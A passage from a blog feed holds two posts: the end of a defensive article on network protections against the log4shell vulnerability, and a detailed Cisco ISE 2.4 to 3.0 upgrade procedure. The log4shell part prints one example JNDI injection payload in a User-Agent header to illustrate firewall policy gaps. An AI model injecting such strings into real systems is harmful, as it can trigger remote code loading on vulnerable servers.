&lt;p&gt;It is critical to ensure that these signatures are updated regularly and almost all network security platforms have a mechanism to automatically update their signatures on a scheduled basis. Monitoring that your network security platforms are on the latest signature version is critical. Additionally, each vendor may make an assumption on the action that its customers would want to take for a particular vulnerability, and as a result define a default action (e.g. drop, reset, alarm, allow) that a network security device takes when detecting a threat. Administrators should review these default actions to make sure that they align with their organizations assessment of the risk/exposure of the vulnerability and how it affects the business.&lt;/p&gt;

&lt;p&gt;If you’re hosting your applications in AWS, consider looking into &lt;a href=&quot;https://aws.amazon.com/blogs/opensource/scaling-threat-prevention-on-aws-with-suricata/&quot;&gt;AWS Network Firewall and Suricata rules&lt;/a&gt;. While creating Suricata rules can be quite complex, Proofpoint offers an free/open rulset (and paid/PRO ruleset) called &lt;a href=&quot;https://rules.emergingthreats.net/open/suricata-5.0/&quot;&gt;Emerging Threats&lt;/a&gt; which are updated very regularly, and in the context of log4shell had signatures available quite quickly.&lt;/p&gt;

&lt;h3 id=&quot;tls-decryption&quot;&gt;TLS Decryption&lt;/h3&gt;
&lt;p&gt;Threat signatures are only as good as they data that is compared against them. With the ever growing use of TLS to encrypt and protect legitimate users data, malicious data is also encrypted. This provides a protection to an attacker, allowing them to avoid the eyes of the security platforms that we deploy in our environments. TLS decryption on firewalls and load balancers allows these network security devices to see the data that is traversing between clients and servers in clear text, before re-encrypting the data and sending it along its way.&lt;/p&gt;

&lt;p&gt;Decryption makes threat signatures far more effective, but there are trade-offs. Depending on how much traffic is flowing through your network security device, it may not have the resources to decrypt all traffic without causing potential performance issues. By reviewing your network devices capabilities and assessing which traffic flows are the most critical to protect, you can determine what traffic should be decrypted while also limiting any performance issues.&lt;/p&gt;

&lt;h3 id=&quot;additional-prevention-measures&quot;&gt;Additional Prevention Measures&lt;/h3&gt;
&lt;p&gt;If you’re unable to utilize your network security devices to detect malicious JNDI strings, or the network security vendors threat signatures miss a variant of the string, it is important that your firewalls security policies restrict access from your web servers outbound to the internet over LDAP, DNS and other related JNDI protocols. As previously mentioned, the initial JNDI string in an HTTP request isn’t malicious on its own. The attack relies on an affected web server communicating outbound with an attacker controlled LDAP server on the internet.&lt;/p&gt;

&lt;p&gt;As a best practice, most firewall security policies should be created around a whitelist model that are very specific in permitting what protected resources can communicate with. Using a firewall platform that permits the creation of rules around &lt;em&gt;&lt;a href=&quot;https://www.paloaltonetworks.com/technologies/app-id&quot;&gt;applications&lt;/a&gt;&lt;/em&gt; instead of &lt;em&gt;services&lt;/em&gt; or &lt;em&gt;ports&lt;/em&gt; will help ensure that sessions through the firewall are exactly what they say they are. Take for example the following malicious JNDI string:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;User-Agent: ${jndi:ldap://127.0.0.1:443/a}&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;If your firewall security policies are created around allowing TCP port 443 out to the internet for users browsing web pages, instead of an &lt;em&gt;application&lt;/em&gt; of HTTPS. An affected web server that receives this malicious JNDI string will attempt to communication over TCP port 443 using LDAP and the firewall will permit the traffic. Instead of creating a security policy permitting TCP port 443 for web browsing, creating a security policy that allows an application of HTTPS &lt;em&gt;and&lt;/em&gt; and TCP port of 443 would ensure that LDAP traffic over TCP port 443 is dropped.&lt;/p&gt;

&lt;p&gt;In the case of a JNDI string that uses DNS as a service, there are two considerations to make:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Do you prevent your web servers from utilizating any DNS server other than your corporate owned/managed DNS servers?&lt;/li&gt;
  &lt;li&gt;Do you utilize any DNS monitoring features on your firewalls, such as Domain Generation Algorithm (&lt;a href=&quot;https://unit42.paloaltonetworks.com/threat-brief-understanding-domain-generation-algorithms-dga/&quot;&gt;DGA&lt;/a&gt;) and &lt;a href=&quot;https://www.paloaltonetworks.com/cyberpedia/what-is-dns-tunnelingbehavior&quot;&gt;DNS tunneling&lt;/a&gt; detection?&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If you allow users and servers in your environment to directly reference internet DNS servers out of your control (e.g. Google DNS) you lose an aspect of visibility and logging that you would otherwise get by enforcing all assets utilize a DNS server that you manage and control. This by itself doesn’t prevent exfiltration of data with log4shell and a JNDI string using DNS. A vulnerable web server that receives such a JNDI string will send a DNS query to its local resolver, which you already most likely permit the web server to query. That local resolve will then most likely reference an upstream DNS server or the root DNS servers (also permitted through your firewall, or no one would be able to resolve internet FQDN’s), to find an answer to the malicious domain name in the JNDI string. Eventually, through a series of iterative DNS queries the DNS server controlled by the attacker will receive the DNS query that the affected host sent, allowing it to log the data that was exfiltrated.&lt;/p&gt;

&lt;p&gt;To block these types of DNS queries, either your firewalls or your DNS server/platform need to implement additional mechanisms of identifying malicious domain names that are either known or recently generated (DGA), or that are exhibiting DNS tunneling.&lt;/p&gt;

&lt;h2 id=&quot;stepping-up-our-game-as-network-security-engineers&quot;&gt;Stepping Up Our Game As Network Security Engineers&lt;/h2&gt;
&lt;p&gt;As network security engineers it is important to fully understand the security platforms we support, and that the applications we protect are understood by us as more than just a source/destination IP and port. Our firewalls, load balancers, and intrusion detection devices are operating at all layers of the stack with full application layer visibility and implementing features at those layers. Building good relations with the application owners whose assets we are helping protect will help ensure that we can do so effectively.&lt;/p&gt;

&lt;p&gt;My experience with reviewing log4shell was greatly aided by the fact that I have taken a full-stack developer course. Although I didn’t learn Java based backends (I was focused on Flask and Django for a backend and HTML/CSS/JS/React at the frontend), it certainly helps me better understand the ecosystem surrounding web-based applications and API’s which are the primary tech stacks that I’m helping protect. While it may not be possible for everyone to go out and take a full-stack course on top of their day job, but learn from your app team every time that you interact with them so that you gain a higher level of understanding. It may also help you next time they “blame the network” for an issue!&lt;/p&gt;</content><author><name>Brian Yaklin</name></author><category term="Security" /><summary type="html">December 9th, 2021 rocked the world for a significant number of IT professionals responsible for building and protecting applications their organizations create/deploy. Apache announced CVE-2021-44228, commonly referred to as log4Shell, a zero-day vulnerability affecting their log4j logging software. Due to the severity of the vulnerability and the relative ease at which to exploit it, it is critical to ensure that affected assets are protected. This article aims to highlight how the network plays a critical role in the protection of assets and detection of vulnerabilities like log4shell.</summary></entry><entry><title type="html">Cisco ISE 2.4 to 3.0 Upgrade Procedure</title><link href="http://localhost:4000/2021/12/27/cisco-ise-2x-to-3x-upgrade.html" rel="alternate" type="text/html" title="Cisco ISE 2.4 to 3.0 Upgrade Procedure" /><published>2021-12-27T00:00:00-07:00</published><updated>2021-12-27T00:00:00-07:00</updated><id>http://localhost:4000/2021/12/27/cisco-ise-2x-to-3x-upgrade</id><content type="html" xml:base="http://localhost:4000/2021/12/27/cisco-ise-2x-to-3x-upgrade.html">&lt;p&gt;If you have ever read through &lt;a href=&quot;https://www.cisco.com/c/en/us/td/docs/security/ise/3-0/upgrade_guide/HTML/b_upgrade_method_3_0.html#id_121933&quot;&gt;Cisco ISE 3.0 Upgrade Guide&lt;/a&gt; you know that it involves a lot of decision points and having to reference many other Cisco reference documents just to build a complete implementation plan for upgrading Cisco ISE from 2.x to 3.x. It is a complicated process if you have never been through it before, and often times you’re left with more questions than answers when researching how to proceed. This usually involves engaging Cisco TAC to help clarify points that aren’t necessarily obvious in their documentation. Having gone through this upgrade path this past year, I thought that documenting the procedures that I followed may help others gain success in their own upgrades. Understand that all implementations are different, so use this as another piece of information as you research how to perform this upgrade.&lt;/p&gt;

&lt;h2 id=&quot;example-cisco-ise-environment&quot;&gt;Example Cisco ISE Environment&lt;/h2&gt;

&lt;p&gt;This guide is built based on the following Cisco ISE environment:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;All Cisco ISE nodes are virtual machines running on VMWare ESXi&lt;/li&gt;
  &lt;li&gt;Nodes are deployed as follows
    &lt;ul&gt;
      &lt;li&gt;Two Admin (primary/secondary)&lt;/li&gt;
      &lt;li&gt;Two Monitor (primary/secondary)&lt;/li&gt;
      &lt;li&gt;Four PSN’s&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;None of the PSN’s are behind load balancers&lt;/li&gt;
  &lt;li&gt;PSN’s are only being used for TACACS/RADIUS authentication, not for any discovery or dot1x authentication&lt;/li&gt;
  &lt;li&gt;AD is used as an external identify source&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Cisco’s documentation briefly glosses over placing your PSN’s behind a load balancer. I have seen this done in larger organizations, but not in smaller ones. There is definitely a benefit to using a load balancer, as it allows you to take a PSN out of rotation so that you can upgrade it and change its IP address (which will save you a few steps in this guide). You avoid causing an outage for clients using the PSN’s as they are querying againt a load balancer VIP and you should only be upgrading one PSN in the load balancer pool at a time.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;cisco-ise-upgrade-methods&quot;&gt;Cisco ISE Upgrade Methods&lt;/h2&gt;
&lt;p&gt;Cisco provides three different methods that you can follow for upgrading Cisco ISE:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Backup and Restore method, which Cisco recommends but is the the most difficult to implement&lt;/li&gt;
  &lt;li&gt;Upgrade using the GUI, which takes more time but is the ‘easiest’ method to follow&lt;/li&gt;
  &lt;li&gt;Upgrade using the CLI, which is just slightly more difficult than using the GUI&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Not all deployments are able to use each of these methods. In this particular example, the GUI and CLI options are not possible because of how the Cisco ISE 2.4 VM’s were deployed. Version 3.0 &lt;a href=&quot;https://www.cisco.com/c/en/us/td/docs/security/ise/3-0/install_guide/b_ise_InstallationGuide30/b_ise_InstallationGuide30_chapter_2.html#ID-1417-000000d9&quot;&gt;requires signinficantly more disk space&lt;/a&gt; than version 2.4. A disk size of 300GB to 600GB are required, as a minimum, on each node regardless of its persona, compared to what many 2.4 deployments required (200GB). Cisco also advises that if you increase the disk size of your VM, you must perform a fresh installation of Cisco ISE to detect the increased capacity. There is no supported method of increasing the disk size.&lt;/p&gt;

&lt;p&gt;The other challenge of building new PSN VM’s is that without a load balancer, all of your routers, switches, and wireless controllers are referencing TACACS/RADIUS server IP addresses that exist directly on the PSN’s. Cisco’s documentation walks through creating new VM’s with new IP addresses, which means that you will need to reconfigure all network infrastructure to point to a new TACACS/RADIUS server IP address. This can involve a significant amount of time if you’re not using automation to implement this task. You do have the ability to change the IP address of the new 3.0 PSN after it has been created and the old 2.4 PSN has been shutdown, but this involves additional steps as well (e.g. having to de-register and re-register the PSN from the admin node, adjusting DNS entries). Instead, this guide walks through keeping both 2.4 and 3.0 VM’s with the same IP addresses, but shutting down the 2.4 VM before building the new 3.0 VM. There is a brief moment in time where impact can be seen by the network device must wait for keepalives to fail to a PSN thats being migrated, before it starts to query a secondary PSN that isn’t currently being migrated.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Another important aspect of upgrading from ISE 2.4 to 3.0 is that licensing changes to requiring smart licensing. If you don’t yet have smart licensing, but need to perform an upgrade, you can enable the grace period license which should provide 90 days for you to continue using all necessary features until you migrade to smart licensing. The steps to adjust licensing are not covered in this guide.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;implementation-and-verification-plan&quot;&gt;Implementation and Verification Plan&lt;/h2&gt;
&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
&lt;p&gt;The steps documented below outline how to migrate Cisco ISE 2.4 VM’s to 3.0 VM’s using the &lt;a href=&quot;https://www.cisco.com/c/en/us/td/docs/security/ise/3-0/upgrade_guide/HTML/b_upgrade_method_3_0.html#id_121933&quot;&gt;Backup and Restore method&lt;/a&gt;. Depending on the size of your infrastructure, you may choose to migrate the PSN’s over multiple change windows. This will depend on how frequenty you make changes in your environment, as you will end up having a ‘split’ cluster where one admin and monitor node remain on version 2.4 while another admin and monitor node are on version 3.0. Throughout multiple change windows, you can disable a version 2.4 PSN and build the 3.0 PSN. If you are frequently making policy changes, you either need to make them in both the 2.4 and 3.0 admin nodes, or migrate all PSN’s during the same change window.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The steps to perform on VMWare ESXi are not covered in this guide. Refer to Cisco’s documentation for VM requirements, and VMWare’s documentation for implementation steps that might be necessary to create the VM.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;step-0---pre-change-readiness&quot;&gt;Step 0 - Pre-Change Readiness&lt;/h3&gt;
&lt;p&gt;To prepare for your migration you will want to ensure the status of multiple elements and perform backups of critical configuration and certificates. This can be accomplished as follows:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Login to your 2.4 Primary Admin Node (PAN).&lt;/li&gt;
  &lt;li&gt;Confirm all certificates are valid and not expired by browsing to &lt;strong&gt;Administration &amp;gt; System &amp;gt; Certificates&lt;/strong&gt; and check the status of all &lt;strong&gt;Trusted Certificates&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;For each external identity source, ensure that connectivity from each PSN to each source is OK. As an example, for AD browse to &lt;strong&gt;Administration &amp;gt; Identity Management &amp;gt; External Identity Sources &amp;gt; Active Directory…&lt;/strong&gt; and for each join point check the reachability status for each PSN.
    &lt;blockquote&gt;
      &lt;p&gt;Identify the AD credentials which are necessary for each AD join-point. These are not restored when using the backup and restore method. Each join-point will need to be recreated later on in this guide.&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;Export any System Certificates that are used by your deployment by browsing to &lt;strong&gt;Administration &amp;gt; System &amp;gt; Certificates&lt;/strong&gt; and clicking on &lt;strong&gt;System Certificates&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;Export any non-default Trusted Certificates that are used by your deploymet by browsing to &lt;strong&gt;Administration &amp;gt; System &amp;gt; Certificates&lt;/strong&gt; and clicking on &lt;strong&gt;Trusted Certificates&lt;/strong&gt;. Many of the certificates here are CA signed certificates that will exist in ISE version 3.0 and are not necessary to manually export and re-import. Only the certificates that you have imported for your organization.
    &lt;blockquote&gt;
      &lt;p&gt;Certificates are not automatically restored in the backup and restore method, therefore it is critical to create a backup of these in case issues are experienced during the upgrade.&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;Document PAN auto-failover settings by browsing to &lt;strong&gt;Administration &amp;gt; System &amp;gt; Deployment &amp;gt; PAN Failover&lt;/strong&gt; and documenting the status and value for all settings.&lt;/li&gt;
  &lt;li&gt;Perform a manual Configuration Data Backup of the Cisco ISE settings. If you require logs to be backed up and referencable in the new ISE 3.0 implementation, perform an Operational Backup (this will be significantly larger and require more time). Browse to &lt;strong&gt;Administration &amp;gt; System &amp;gt; Backup &amp;amp; Restore&lt;/strong&gt;, select &lt;strong&gt;Configuration Data Backup&lt;/strong&gt; and click on &lt;strong&gt;Backup Now&lt;/strong&gt;. Provide the necessary details and utilize an existing backup repository.&lt;/li&gt;
  &lt;li&gt;SSH to each Cisco ISE node and log the output of the following commands to file. These will later be used to reconfigure the new Cisco ISE 3.0 VM’s, as well as to capture the status of each VM prior to the upgrade to identify any anomalies if they happen (e.g. high CPU, application services not running, etc)
    &lt;ul&gt;
      &lt;li&gt;show clock&lt;/li&gt;
      &lt;li&gt;show version&lt;/li&gt;
      &lt;li&gt;show ntp&lt;/li&gt;
      &lt;li&gt;show uptime&lt;/li&gt;
      &lt;li&gt;show cpu usage&lt;/li&gt;
      &lt;li&gt;show repository&lt;/li&gt;
      &lt;li&gt;show application&lt;/li&gt;
      &lt;li&gt;show application status ise&lt;/li&gt;
      &lt;li&gt;show running-config&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Ensure that a DNS entry exists for each Cisco ISE node, as this will be used as part of the re-registration process when joining a PSN to the version 3.0 ISE admin node.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;step-1---create-cisco-ise-30-primary-admin-node&quot;&gt;Step 1 - Create Cisco ISE 3.0 Primary Admin Node&lt;/h3&gt;
&lt;p&gt;During this step we will be disabling the version 2.4 secondary admin node (SAN) and re-creating it as the version 3.0 primary admin node (PAN).&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Login to your 2.4 Primary Admin Node (PAN).&lt;/li&gt;
  &lt;li&gt;Disable PAN auto-failover by browsing to &lt;strong&gt;Administration &amp;gt; System &amp;gt; Deployment &amp;gt; PAN Failover&lt;/strong&gt; and unchecking the &lt;strong&gt;Enable PAN Auto Failover&lt;/strong&gt; option, then click save.&lt;/li&gt;
  &lt;li&gt;Disjoin the SAN from each AD join-point. Browse to &lt;strong&gt;Administration &amp;gt; Identity Management &amp;gt; External Identity Sources&lt;/strong&gt;, click the &lt;strong&gt;Active Directory&lt;/strong&gt; folder and navigate to each join-point and perform the following steps:
    &lt;ol&gt;
      &lt;li&gt;Find the SAN and select the checkbox next to it&lt;/li&gt;
      &lt;li&gt;Click the &lt;strong&gt;Leave&lt;/strong&gt; button to Disjoin the SAN&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;De-register the SAN from the version 2.4 cluster. Browse to &lt;strong&gt;Administration &amp;gt; System &amp;gt; Deployment&lt;/strong&gt; and check the box next to the SAN. Click the &lt;strong&gt;Deregister&lt;/strong&gt; button and then &lt;strong&gt;OK&lt;/strong&gt; to de-register the SAN from the cluster.&lt;/li&gt;
  &lt;li&gt;Shutdown the version 2.4 SAN VM in VMWare.&lt;/li&gt;
  &lt;li&gt;Create the ISE version 3.0 VM which will be configured with the properties of the version 2.4’s SAN (except it will be the PAN of the version 3.0 cluster)&lt;/li&gt;
  &lt;li&gt;Once the VM is built in the hypervisor, use the serial console to connect and issue the &lt;strong&gt;setup&lt;/strong&gt; command. This will prompt you for various parameters such as hostname, IP address, DNS and NTP servers, local admin credentials to use, etc. You can find this information from the output of the &lt;strong&gt;show running-config&lt;/strong&gt; that was captured during step 0 of this guide.&lt;/li&gt;
  &lt;li&gt;After entering the initial setup parameters, the node will reload. Log back in to the CLI using the serial console and configure any remaining features by comparing the output of the &lt;strong&gt;show running-config&lt;/strong&gt; from before the change with what is currently in the configuration. An example of what may need to be configured would be features like SNMP (enabling it, community strings, trap destinations, etc.) and any other local accounts.&lt;/li&gt;
  &lt;li&gt;Confirm that the node is running the correct version and patches with the &lt;strong&gt;show version&lt;/strong&gt; command and that the ISE process is running with the &lt;strong&gt;show application status ise&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;Browse to the IP address or FQDN of the version 3.0 PAN that has just been created and login. The web GUI’s admin credentials are those that were set using the &lt;strong&gt;setup&lt;/strong&gt; command on the CLI
    &lt;blockquote&gt;
      &lt;p&gt;Both the web and CLI admin credentials may start off as the &lt;em&gt;same&lt;/em&gt; credential, but Cisco ISE treats them as two completely separate accounts.&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;Set the role of the version 3.0 PAN as an admin node by browsing to &lt;strong&gt;Administration &amp;gt; System &amp;gt; Deployment&lt;/strong&gt; and clicking on &lt;strong&gt;Deployment&lt;/strong&gt;. Select the node from the list and enable the &lt;strong&gt;Administration&lt;/strong&gt; role on the &lt;strong&gt;General Settings&lt;/strong&gt; tab.&lt;/li&gt;
  &lt;li&gt;Browse to &lt;strong&gt;Administration &amp;gt; System &amp;gt; Maintenance &amp;gt; Repository&lt;/strong&gt; and create a repository so that the backup can be imported.&lt;/li&gt;
  &lt;li&gt;Import this nodes system certificate by browsing to &lt;strong&gt;Administration &amp;gt; System &amp;gt; Certificates&lt;/strong&gt; and click on &lt;strong&gt;System Certificates&lt;/strong&gt;. Click on &lt;strong&gt;Import&lt;/strong&gt; and fill in the details of the version 3.0 PAN and select the certificate file for this node that was exported during step 0.&lt;/li&gt;
  &lt;li&gt;Import all trusted certificates by browsing to &lt;strong&gt;Administration &amp;gt; System &amp;gt; Certificates&lt;/strong&gt; and click on &lt;strong&gt;Trusted Certificates&lt;/strong&gt;. Import each Trusted Certificate that were exported during step 0, and compare the configuration with that of the existing version 2.4 PAN that should still be accessible.&lt;/li&gt;
  &lt;li&gt;Create the Active Directory join-points by browsing to &lt;strong&gt;Administration &amp;gt; Identity Management &amp;gt; External Identity Sources&lt;/strong&gt; and clicking on &lt;strong&gt;Active Directory&lt;/strong&gt;. Once again, you can look at both the version 2.4 PAN and the new version 3.0 PAN at the same time to ensure that each join-point is created the same.&lt;/li&gt;
  &lt;li&gt;Join the version 3.0 PAN to each AD join-point. Under each join-points &lt;strong&gt;Connection&lt;/strong&gt; tab click the &lt;strong&gt;Join&lt;/strong&gt; button, select the new node from the list, provide the AD credentials gathered as part of step 0, and click submit. Confirm that the status of the node for each join-point is &lt;strong&gt;Operational&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;Restore the ISE backup by SSH’ing to the version 3.0 PAN and logging in. Run the command &lt;strong&gt;restore FILE_NAME repository REPO_NAME encryption-key plain ENC_KEY&lt;/strong&gt; using the repository name that was created earlier, along with the filename that was given to the backup during step 0.&lt;/li&gt;
  &lt;li&gt;You can monitor the backup restoration using the &lt;strong&gt;show restore status&lt;/strong&gt; command. Once the restore has been completed, the node will reload. SSH back into this node and issue the &lt;strong&gt;show application status ise&lt;/strong&gt; command to ensure the ISE process is running.&lt;/li&gt;
  &lt;li&gt;Log back into the version 3.0 PAN web GUI. Make the version 3.0 PAN the primary admin node by browsing to &lt;strong&gt;Administration &amp;gt; System &amp;gt; Deployment&lt;/strong&gt; and click the name of the node. Under the &lt;strong&gt;General Settings&lt;/strong&gt; click the button that says &lt;strong&gt;Make Primary&lt;/strong&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;step-2---create-cisco-ise-30-primary-monitor-node&quot;&gt;Step 2 - Create Cisco ISE 3.0 Primary Monitor Node&lt;/h3&gt;
&lt;p&gt;During this step we will be disabling the version 2.4 secondary monitor node (SMN) and re-creating it as the version 3.0 primary monitor node (PMN). Many of these steps are the same as in step 1 when creating the ISE 3.0 PAN, so the steps are shortened for brevity.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Login to your 2.4 PAN’s web GUI.&lt;/li&gt;
  &lt;li&gt;Disjoin the SMN from each AD join-point in the version 2.4 PAN.&lt;/li&gt;
  &lt;li&gt;De-register the SMN in the version 2.4 PAN.&lt;/li&gt;
  &lt;li&gt;Shutdown the version 2.4 SMN VM (don’t delete), create the new version 3.0 SMN VM and configure over the serial console using the &lt;strong&gt;setup&lt;/strong&gt; command, referencing the &lt;strong&gt;show running-config&lt;/strong&gt; that was captured during step 0 of this guide. The node will reload after finishing the setup, log back in and configure any remaining elements (SNMP, local accounts, etc.) by comparing the &lt;strong&gt;show running-config&lt;/strong&gt; that was gathered in step 0 with the current output of the configuration on the version 3.0 node.&lt;/li&gt;
  &lt;li&gt;Validate that the node is running the proper version of software with &lt;strong&gt;show version&lt;/strong&gt; and that the ISE process is running with &lt;strong&gt;show application status ise&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;Login to your 3.0 PAN’s web GUI.&lt;/li&gt;
  &lt;li&gt;Register the verison 3.0 PMN VM as the primary monitoring node by registering the node in the version 3.0 PAN.&lt;/li&gt;
  &lt;li&gt;Set the role of the version 3.0 PMN as a monitor node by browsing to &lt;strong&gt;Administration &amp;gt; System &amp;gt; Deployment&lt;/strong&gt; and clicking on &lt;strong&gt;Deployment&lt;/strong&gt;. Select the node from the list and enable the &lt;strong&gt;Monitor&lt;/strong&gt; role on the &lt;strong&gt;General Settings&lt;/strong&gt; tab, setting it to primary if prompted.&lt;/li&gt;
  &lt;li&gt;Import this nodes system certificate by browsing to &lt;strong&gt;Administration &amp;gt; System &amp;gt; Certificates&lt;/strong&gt; and click on &lt;strong&gt;System Certificates&lt;/strong&gt;. Click on &lt;strong&gt;Import&lt;/strong&gt; and fill in the details of the version 3.0 PMN and select the certificate file for this node that was exported during step 0.&lt;/li&gt;
  &lt;li&gt;Join the node to each AD join-point and ensure that its status is &lt;strong&gt;Operational&lt;/strong&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;step-3---create-cisco-ise-30-node-groups&quot;&gt;Step 3 - Create Cisco ISE 3.0 Node Groups&lt;/h3&gt;
&lt;p&gt;If you use node groups in your ISE deployment, follow the steps listed below.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Node groups are not re-created when using the backup and restore method with Cisco ISE. They must be manually recreated.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;Login to your 3.0 PAN’s web GUI.&lt;/li&gt;
  &lt;li&gt;Browse to &lt;strong&gt;Administration &amp;gt; Deployment&lt;/strong&gt; and under the &lt;strong&gt;Deployment&lt;/strong&gt; column click the gear icon and &lt;strong&gt;Create Node Group&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;Create the node groups by also logging into your version 2.4 PAN and comparing the configuration with your new version 3.0 PAN.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;step-4---create-cisco-ise-30-policy-service-nodes&quot;&gt;Step 4 - Create Cisco ISE 3.0 Policy Service Nodes&lt;/h3&gt;
&lt;p&gt;During this step we will be disabling a version 2.4 policy service node (PSN) and re-creating it as a version 3.0 PSN. Many of these steps are the same as in step 1 when creating the ISE 3.0 PAN, so the steps are shortened for brevity. Perform each of these steps for each PSN, but only migrate one PSN at a time.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;At this stage, you may choose to migrate PSN’s across multiple change windows depending on your organizations needs. However, if you need to make any policy configuration changes in Cisco ISE you will need to perform identical changes in both the version 2.4 and 3.0 PAN’s. There will also be a period in time where the admin and monitor nodes of each cluster are not redundant.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;Login to your 2.4 PAN’s web GUI.&lt;/li&gt;
  &lt;li&gt;Disable the Policy Service feature for this node so that it will no longer respond to TACACS/RADUS requests (allowing any network device that used this PSN to mark it as down after a period of time and reference another PSN), by browsing to &lt;strong&gt;Administration &amp;gt; System &amp;gt; Deployments&lt;/strong&gt;, clicking on the node, navigating to the &lt;strong&gt;General Settings&lt;/strong&gt; tab and deselecting the checkbox for &lt;strong&gt;Policy Service&lt;/strong&gt;, then click &lt;strong&gt;Save&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;Disjoin the PSN from each AD join-point in the version 2.4 PAN.&lt;/li&gt;
  &lt;li&gt;De-register the PSN in the version 2.4 PAN.&lt;/li&gt;
  &lt;li&gt;Shutdown the version 2.4 PSN VM (don’t delete), create the new version 3.0 PSN VM and configure over the serial console using the &lt;strong&gt;setup&lt;/strong&gt; command, referencing the &lt;strong&gt;show running-config&lt;/strong&gt; that was captured during step 0 of this guide. The node will reload after finishing the setup, log back in and configure any remaining elements (SNMP, local accounts, etc.) by comparing the &lt;strong&gt;show running-config&lt;/strong&gt; that was gathered in step 0 with the current output of the configuration on the version 3.0 node.&lt;/li&gt;
  &lt;li&gt;Validate that the node is running the proper version of software with &lt;strong&gt;show version&lt;/strong&gt; and that the ISE process is running with &lt;strong&gt;show application status ise&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;Login to your 3.0 PAN’s web GUI.&lt;/li&gt;
  &lt;li&gt;Register the verison 3.0 PSN VM in the version 3.0 PAN’s deployment.&lt;/li&gt;
  &lt;li&gt;Import this nodes system certificate by browsing to &lt;strong&gt;Administration &amp;gt; System &amp;gt; Certificates&lt;/strong&gt; and click on &lt;strong&gt;System Certificates&lt;/strong&gt;. Click on &lt;strong&gt;Import&lt;/strong&gt; and fill in the details of the version 3.0 PSN and select the certificate file for this node that was exported during step 0.&lt;/li&gt;
  &lt;li&gt;Join the node to each AD join-point and ensure that its status is &lt;strong&gt;Operational&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;Set the role of the version 3.0 PSN by browsing to &lt;strong&gt;Administration &amp;gt; System &amp;gt; Deployment&lt;/strong&gt; and clicking on &lt;strong&gt;Deployment&lt;/strong&gt;. Select the node from the list and enable the &lt;strong&gt;Policy Service&lt;/strong&gt; role on the &lt;strong&gt;General Settings&lt;/strong&gt; tab and compare the remaining settings to that of the node in your version 2.4 PAN’s web GUI.&lt;/li&gt;
  &lt;li&gt;Login to various network devices that are configured with this PSN and issue &lt;strong&gt;test aaa…&lt;/strong&gt; type commands to confirm reachability to the PSN, as well as that the PSN can authenticate a test user ID using its AD join-points. You can also monitor live requests via the version 3.0 PAN by browsing to &lt;strong&gt;Operations &amp;gt; RADIUS &amp;gt; Live Logs&lt;/strong&gt; and &lt;strong&gt;Operations &amp;gt; TACACS &amp;gt; Live Logs&lt;/strong&gt; to see incoming TACACS/RADIUS requests and if they are successfully authenticated/authorized.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;step-5---create-cisco-ise-30-secondary-monitor-node&quot;&gt;Step 5 - Create Cisco ISE 3.0 Secondary Monitor Node&lt;/h3&gt;
&lt;p&gt;During this step we will be disabling the version 2.4 primary monitor node (PMN) and re-creating it as the version 3.0 secondary monitor node (SMN). Follow the same steps that are used in step 2, but when setting the role of this SMN, if prompted set it to secondary.&lt;/p&gt;

&lt;h3 id=&quot;step-6---create-cisco-ise-30-secondary-admin-node&quot;&gt;Step 6 - Create Cisco ISE 3.0 Secondary Admin Node&lt;/h3&gt;
&lt;p&gt;During this step we will be disabling the version 2.4 primary admin node (PAN) and re-creating it as the version 3.0 secondary admin node (SAN). Follow many of the same steps that are used in step 2, but when setting the role of this SAN, set it to Admin and if prompted mark it as secondary.&lt;/p&gt;

